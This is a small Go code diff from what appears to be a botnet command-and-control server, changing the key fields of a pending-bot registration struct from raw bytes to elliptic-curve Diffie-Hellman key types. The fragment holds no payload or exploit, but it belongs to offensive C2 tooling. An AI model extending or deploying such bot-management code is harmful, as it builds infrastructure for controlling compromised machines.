@@ -3,6 +3,7 @@ package main
 import (
 	database "c2/server/db"
 	"c2/server/models"
+	"crypto/ecdh"
 	"fmt"
 	"log"
 	"net/http"
@@ -16,8 +17,8 @@ type PendingBots struct {
 	Challenge        string
 	Agentid          string
 	RegsterKey       string
-	PublicKey        []byte
-	PrivatekeyServer []byte
+	PublicKey        *ecdh.PublicKey
+	PrivatekeyServer *ecdh.PrivateKey
 }
 
 type c2 struct {
